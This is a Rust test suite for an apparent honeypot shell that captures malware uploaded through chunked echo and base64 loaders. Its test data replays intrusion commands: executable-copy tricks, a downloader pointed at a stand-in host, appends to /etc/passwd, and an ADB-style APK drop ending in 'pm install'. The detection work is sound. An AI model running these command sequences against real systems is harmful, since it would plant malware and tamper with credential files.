        let mut shell = loader_shell(&captures);
        let chunks = upload_chunks(&mut shell, ".i", DOWNLOADER);
        shell.handle_input("cp /bin/ls .j && cat .i>.j &&rm .i && cp .j .i &&rm .j");
        let (out, line_events) = shell.handle_input("./.i 203 0 113 9 8080");
        assert!(out.is_empty(), "{out}");
        assert_eq!(out.status, 1);
        let urls: Vec<&serde_json::Value> = line_events
            .iter()
            .filter(|e| e.signal_type == sensor_wire::SIGNAL_HONEYPOT_FILE_DOWNLOAD)
            .map(|e| &e.metadata)
            .collect();
        assert_eq!(urls.len(), 1, "{line_events:?}");
        assert_eq!(urls[0]["url"], "http://203.0.113.9:8080/s2.bin");
        assert_eq!(urls[0]["derived_from"], "echo_loader_args");
        // Running it again is the same sample, not a second one.
        shell.handle_input("./.i 203 0 113 9 8080");
        drop(shell);
        drop(captures);
        handoff.drain(std::time::Duration::from_secs(5)).await;
        let events = events(dir.path());
        assert_eq!(events.len(), 1, "{events:?}");
        let meta = &events[0]["metadata"];
        assert_eq!(meta["capture_reason"], "echo_loader");
        assert_eq!(meta["chunk_count"], chunks);
        assert_eq!(meta["destination"], "/tmp/.i");
        assert_eq!(meta["size"], DOWNLOADER.len());
        assert_eq!(meta["end_reason"], "transfer_complete");
        assert_eq!(
            meta["sha256"],
            Sha256::digest(DOWNLOADER)
                .iter()
                .map(|b| format!("{b:02x}"))
                .collect::<String>()
        );
    }

    /// An assembly the session never ran is taken as the session leaves it; a single `echo > f`
    /// and chunks appended to a file the attacker did not start are not assemblies.
    #[tokio::test]
    async fn an_assembly_never_run_is_captured_at_the_session_end_and_nothing_else_is() {
        let dir = tempfile::tempdir().unwrap();
        let handoff = handoff(dir.path());
        let captures = StdinCaptures::new(handoff.clone(), source());
        let mut shell = loader_shell(&captures);
        let chunks = upload_chunks(&mut shell, "part", DOWNLOADER);
        shell.handle_input("echo probe > /tmp/w");
        shell.handle_input("echo one >> /etc/passwd");
        shell.handle_input("echo two >> /etc/passwd");
        captures.end_session(CaptureEnd::PeerClosed);
        drop(shell);
        drop(captures);
        handoff.drain(std::time::Duration::from_secs(5)).await;
        let events = events(dir.path());
        assert_eq!(events.len(), 1, "{events:?}");
        let meta = &events[0]["metadata"];
        assert_eq!(meta["destination"], "/tmp/part");
        assert_eq!(meta["chunk_count"], chunks);
        assert_eq!(meta["end_reason"], "peer_closed");
        assert_eq!(meta["complete"], true);
    }

    /// A file overwritten after its last chunk holds something else: neither running it nor the
    /// session's end takes it for the assembly.
    #[tokio::test]
    async fn a_file_overwritten_after_its_last_chunk_is_not_the_assembly() {
        let dir = tempfile::tempdir().unwrap();
        let handoff = handoff(dir.path());
        let captures = StdinCaptures::new(handoff.clone(), source());
        let mut shell = loader_shell(&captures);
        upload_chunks(&mut shell, ".i", DOWNLOADER);
        shell.handle_input("cp /bin/ls .i");
        let (out, line_events) = shell.handle_input("chmod +x .i; ./.i 203 0 113 9 80");
        // The copy is `ls`, and runs as `ls` does: none of the operands exists.
        assert_eq!(out.status, 2);
        assert_eq!(line_events.len(), 1, "no derived URL: {line_events:?}");
        drop(shell);
        drop(captures);
        handoff.drain(std::time::Duration::from_secs(5)).await;
        assert!(events(dir.path()).is_empty());
    }

    /// Standard base64 of `data`, written here independently of the shell's own encoder so the
    /// loader test below cannot agree with the shell by sharing its mistakes.
    fn base64_of(data: &[u8]) -> String {
        const SYMBOLS: &[u8; 64] =
            b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        let mut text = String::new();
        for group in data.chunks(3) {
            let [a, b, c] = [0usize, 1, 2].map(|i| u32::from(group.get(i).copied().unwrap_or(0)));
            let word = (a << 16) | (b << 8) | c;
            for (i, shift) in [18u32, 12, 6, 0].into_iter().enumerate() {
                if i <= group.len() {
                    text.push(char::from(SYMBOLS[((word >> shift) & 63) as usize]));
                } else {
                    text.push('=');
                }
            }
        }
        text
    }

    /// A small ZIP that looks like an APK to `pm`: the local-header magic, the manifest entry's
    /// name, and bytes past 0x7f. Built here; it is not any real package.
    fn synthetic_apk() -> Vec<u8> {
        let mut apk = b"PK\x03\x04".to_vec();
        apk.extend_from_slice(b"AndroidManifest.xml");
        apk.extend((0..=255u8).cycle().take(900));
        apk
    }

    fn sha_hex(bytes: &[u8]) -> String {
        Sha256::digest(bytes)
            .iter()
            .map(|b| format!("{b:02x}"))
            .collect()
    }

    /// The loader an ADB bot runs: base64 text appended chunk by chunk with `echo -n`, its size
    /// checked, decoded, the decode's size checked, then `pm install`. Every command is its own
    /// `shell:<command>` stream, so its own shell over the connection's shared filesystem. The
    /// decoded APK is the sample, captured when `pm install` takes it, once.
    #[tokio::test]
    async fn a_base64_loader_run_as_separate_exec_shells_is_captured_decoded_at_pm_install() {
        let dir = tempfile::tempdir().unwrap();
        let handoff = handoff(dir.path());
        let captures = StdinCaptures::new(handoff.clone(), source());
        let fs = FakeFs::android();
        let run = |line: &str| {
            let mut shell = FakeShell::android(fs.share(), ctx()).with_captures(captures.clone());
            shell.handle_input(line).0
        };
        let apk = synthetic_apk();
        let text = base64_of(&apk);
        let b64 = "/data/local/tmp/probe.apk.b64";
        let dec = "/data/local/tmp/probe.apk.dec";
        let installed = "/data/local/tmp/probe.apk";

        run(&format!("rm -f '{b64}' '{dec}' '{installed}'"));
        let chunks: Vec<&str> = text
            .as_bytes()
            .chunks(120)
            .map(|c| std::str::from_utf8(c).unwrap())
            .collect();
        for chunk in &chunks {
            assert_eq!(run(&format!("echo -n '{chunk}' >> '{b64}'")).status, 0);
        }
        let counted = run(&format!("wc -c < '{b64}'"));
        assert_eq!(
            (counted.status, counted.bytes()),
            (0, format!("{}\n", text.len()).as_bytes())
        );
        assert_eq!(run(&format!("base64 -d '{b64}' > '{dec}'")).status, 0);
        let counted = run(&format!("wc -c < '{dec}'"));
        assert_eq!(counted.bytes(), format!("{}\n", apk.len()).as_bytes());
        assert_eq!(run(&format!("mv '{dec}' '{installed}'")).status, 0);
        let result = run(&format!("pm install -r '{installed}'"));
        assert_eq!(result.status, 0);
        assert!(
            result.contains("Success"),
            "{}",
            String::from_utf8_lossy(result.bytes())
        );
        // Installing it again is the same sample.
        run(&format!("pm install -r '{installed}'"));

        captures.end_session(CaptureEnd::PeerClosed);
        drop(captures);
        handoff.drain(std::time::Duration::from_secs(5)).await;
        let events = events(dir.path());
        let apks: Vec<_> = events
            .iter()
            .filter(|e| e["metadata"]["sha256"] == sha_hex(&apk))
            .collect();
        assert_eq!(apks.len(), 1, "{events:?}");
        let meta = &apks[0]["metadata"];
        assert_eq!(meta["capture_reason"], "echo_loader");
        assert_eq!(meta["size"], apk.len());
        assert_eq!(meta["chunk_count"], chunks.len());
        assert_eq!(meta["destination"], installed);
        assert_eq!(meta["end_reason"], "transfer_complete");
        // The base64 text it was built from is the only other sample, taken as the session ends.
        assert_eq!(events.len(), 2, "{events:?}");
        let source_text = events
            .iter()
            .find(|e| e["metadata"]["sha256"] == sha_hex(text.as_bytes()))
            .unwrap();
        assert_eq!(source_text["metadata"]["end_reason"], "peer_closed");
    }

    /// A decode of typed input counts as many chunks as the input did, so a loader that decodes
    /// and leaves is still captured as the session ends; a decode of a system file is nobody's
    /// upload.
    #[tokio::test]
    async fn a_decoded_assembly_never_installed_is_taken_at_the_session_end() {
        let dir = tempfile::tempdir().unwrap();
        let handoff = handoff(dir.path());
        let captures = StdinCaptures::new(handoff.clone(), source());
        let fs = FakeFs::android();
        let run = |line: &str| {
            FakeShell::android(fs.share(), ctx())
                .with_captures(captures.clone())
                .handle_input(line)
                .0
        };
        let apk = synthetic_apk();
        let text = base64_of(&apk);
        for chunk in text.as_bytes().chunks(200) {
            let chunk = std::str::from_utf8(chunk).unwrap();
            run(&format!("echo -n '{chunk}' >> /data/local/tmp/p.b64"));
        }
        run("base64 -d /data/local/tmp/p.b64 > /data/local/tmp/p.bin");
        run("base64 /system/build.prop | base64 -d > /data/local/tmp/sys.bin");
        captures.end_session(CaptureEnd::IdleTimeout);
        drop(captures);
        handoff.drain(std::time::Duration::from_secs(5)).await;
        let events = events(dir.path());
        let decoded = events
            .iter()
            .find(|e| e["metadata"]["sha256"] == sha_hex(&apk))
            .unwrap_or_else(|| panic!("the decoded file was not captured: {events:?}"));
        assert_eq!(decoded["metadata"]["destination"], "/data/local/tmp/p.bin");
        assert_eq!(decoded["metadata"]["end_reason"], "idle_timeout");
        assert!(
            events
                .iter()
                .all(|e| e["metadata"]["destination"] != "/data/local/tmp/sys.bin"),
            "{events:?}"
        );
    }
}
